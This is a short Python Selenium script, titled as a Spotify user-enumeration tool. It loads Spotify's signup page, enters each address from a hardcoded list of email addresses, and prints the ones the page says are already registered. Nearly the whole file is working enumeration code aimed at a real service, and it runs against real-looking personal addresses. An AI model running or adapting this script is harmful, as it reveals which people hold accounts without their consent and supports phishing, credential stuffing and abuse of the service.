#  User Enum Spotify

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')


print("The usernames present in spotify are:")

#for i in ["ccohen@aol.com", "keijser@aol.com", "ajohnson@hotmail.com", "rnewman@aol.com", "sfoskett@hotmail.com", "seurat@aol.com", "richard@gmail.com", "punkis@gmail.com", "jadavis@outlook.com", "staffelb@att.net", "pplinux@icloud.com", "lamky@optonline.net", "ccoerhen@aol.com", "keijserqer@aol.com", "ajohneesdson@hotmail.com", "rnewman@aol.com", "sfosksdett@hotmail.com", "seusdrat@aol.com", "richard@gmail.com", "pssunkis@gmail.com", "jadavssis@outlook.com", "stafssfelb@att.net", "pplinsdux@icloud.com", "laamky@optonline.net"]:
for i in ["ccohen@gmail.com", "superman@gmail.com", "keijser@yahoo.com", "mredjeansjane@gmail.com", "ajohnson@yahoo.com", "rnewman@gmail.com", "sfoskett@yahoo.com", "seurat@yahoo.com", "richard@gmail.com", "punkyis@gmail.com"]:

    user = i

    driver.get("https://www.spotify.com/ca-en/signup/?forward_url=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect%3Flocale%3Dca-en")
    p1 = driver.page_source
    #elem=driver.find_element_by_name("Mobile Number or Email")
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)


    if "This email is already connected to an account" in p3:
        print(i)
